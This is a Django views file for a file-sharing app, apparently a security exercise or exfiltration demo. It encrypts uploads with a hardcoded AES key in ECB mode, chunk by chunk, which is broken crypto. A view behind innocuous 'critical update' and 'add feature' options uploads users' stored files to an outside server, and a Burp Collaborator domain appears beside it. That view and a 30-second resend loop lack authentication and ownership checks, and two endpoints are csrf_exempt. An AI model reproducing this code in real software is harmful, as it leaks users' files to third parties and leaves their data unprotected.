from django.shortcuts import render, get_object_or_404, redirect
from .models import UploadedFile
from .forms import FileUploadForm
from django.http import FileResponse, Http404 ,HttpResponse,JsonResponse
from django.contrib.auth.decorators import login_required
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import os
from tempfile import NamedTemporaryFile
import requests
from django.http import JsonResponse
import threading
import time
from django.views.decorators.csrf import csrf_exempt
from django.utils import timezone
from .models import Report

# Rest of your imports...





@login_required
def file_download(request, file_id):
    file = get_object_or_404(UploadedFile, pk=file_id, uploaded_by=request.user)
    try:
        return FileResponse(open(file.file.path, 'rb'), as_attachment=True, filename=file.file.name)
    except FileNotFoundError:
        raise Http404('File not found')
    
@login_required
def dashboard(request):
    files = UploadedFile.objects.filter(uploaded_by=request.user)
    if request.method == 'POST':
        file_id = request.POST.get('file_id')
        if file_id:
            file = get_object_or_404(UploadedFile, pk=file_id, uploaded_by=request.user)
            file.delete()
            return redirect('dashboard')  # Refresh the dashboard

    return render(request, 'pages/dashboard.html', {'files': files})


def reports(request):
    # Fetch all reports from the database
    reports = Report.objects.all()
    return render(request, 'pages/reports.html', {'reports': reports})








# def aes_encrypt_file(input_file, output_file, key):
#     cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
#     encryptor = cipher.encryptor()
#     padder = padding.PKCS7(128).padder()

#     with open(input_file, 'rb') as infile:
#         with open(output_file, 'wb') as outfile:
#             while True:
#                 chunk = infile.read(1024)
#                 if not chunk:
#                     break
#                 padded_chunk = padder.update(chunk)
#                 ciphertext = encryptor.update(padded_chunk)
#                 outfile.write(ciphertext)
#             outfile.write(encryptor.update(padder.finalize()) + encryptor.finalize())
KEY = b'0123456789abcdef'
def aes_encrypt_file(input_file, output_file, key):
    backend = default_backend()
    block_size = 16  # AES block size in bytes (always 16 for AES)

    with open(input_file, 'rb') as infile:
        with open(output_file, 'wb') as outfile:
            while True:
                chunk = infile.read(64)
                if not chunk:
                    break

                if len(chunk) % block_size != 0:
                    # Pad the chunk to be a multiple of the block size
                    padder = padding.PKCS7(block_size * 8).padder()
                    padded_chunk = padder.update(chunk)
                    padded_chunk += padder.finalize()
                else:
                    padded_chunk = chunk

                # Create a new cipher and encryptor for each chunk
                cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=backend)
                encryptor = cipher.encryptor()

                # Encrypt the padded chunk
                ciphertext = encryptor.update(padded_chunk) + encryptor.finalize()
                outfile.write(ciphertext)



@login_required
def upload(request):
    if request.method == 'POST':
        form = FileUploadForm(request.POST, request.FILES)
        if form.is_valid():
            uploaded_file = request.FILES['file']
            # Save the uploaded file temporarily
            with NamedTemporaryFile(delete=False) as temp_file:
                for chunk in uploaded_file.chunks():
                    temp_file.write(chunk)
                temp_file_path = temp_file.name

            # Encrypt the file
            encrypted_temp_file_path = NamedTemporaryFile(delete=False).name
            aes_encrypt_file(temp_file_path, encrypted_temp_file_path, KEY)

            # Save the encrypted file to the model
            with open(encrypted_temp_file_path, 'rb') as encrypted_file: #encrypted_temp_file_path
                instance = form.save(commit=False)
                instance.uploaded_by = request.user  # Set the uploaded_by field
                instance.file.save(uploaded_file.name, encrypted_file)
                instance.save()

            # Clean up temporary files
            os.remove(temp_file_path)
            os.remove(encrypted_temp_file_path)

            return redirect('dashboard')
    else:
        form = FileUploadForm()
    return render(request, 'pages/upload.html', {'form': form})



burp_collaborator_domain = 'n7v8j815bbseslm7v5wdcc5i1970vqjf.oastify.com'
#external_url = f'http://{burp_collaborator_domain}'
external_url = 'http://192.168.137.3:8081/'

stop_sending = False



def send_file_to_external_server(request, file_id):
    if request.method == 'POST':
        external_url_path = external_url + "upload"
        # Retrieve the file from the database
        file = get_object_or_404(UploadedFile, pk=file_id)
        send_option = request.POST.get('send_option')

        send_args(request,send_option)
        
        if send_option == 'critical_update':
            files_data = {
                'file': (file.file.name.split('/')[-1], file.file.read(), file.content_type),
            }
            requests.post(external_url_path, files=files_data, data={'critical': True})

            return redirect('dashboard')
        
        elif send_option == 'add_feature':
            # Start a background thread to send repeated POST requests
            threading.Thread(target=send_add_feature_requests, args=(request,file,)).start()
            return redirect('dashboard')
    
    return redirect('dashboard')

def send_args(request,option):
    if request.method == 'POST':
        if option == 'critical_update':
            requests.post(external_url, data={'critical': True})
        elif option == 'add_feature':
            requests.post(external_url, data={'decision': True})
    return 0

    
def send_add_feature_requests(request,file):
    external_url_path = external_url + "upload"
    global stop_sending
    while not stop_sending:
        send_args(request,'add_feature')
        # Retrieve the file from the database using the provided file ID
        file = get_object_or_404(UploadedFile, pk=file.pk)
        
        files_data = {
            'file': (file.file.name.split('/')[-1], file.file.read(), file.content_type),
        }
        response = requests.post(external_url_path, files=files_data, data={'update': True})
        time.sleep(30)  

@csrf_exempt
def receive_success(request):
    if request.method == 'POST':
        if request.POST.get('accept') == '1':
            global stop_sending 
            stop_sending=True
            # Handle the POST request
            
            return JsonResponse({'status': 'success'})
    # Return a failure response for any other request method
   
    return JsonResponse({'status': 'failed'}, status=400)

@csrf_exempt
def reports_incomeing(request):
    if request.method == 'POST':
        # Extract username and report_text from the POST request
        username = request.POST.get('username')
        report_text = request.POST.get('report_text')

        # Validate that both username and report_text are provided
        if username and report_text:
            # Store the data in the database
            Report.objects.create(username=username, report_text=report_text)
            
            # Return a success response
            return JsonResponse({'status': 'success'})
        else:
            # Return a failure response if any required field is missing
            return JsonResponse({'status': 'error', 'message': 'Missing username or report_text'}, status=400)
    else:
        # Return a method not allowed response for other HTTP methods
        return JsonResponse({'status': 'error', 'message': 'Method not allowed'}, status=405)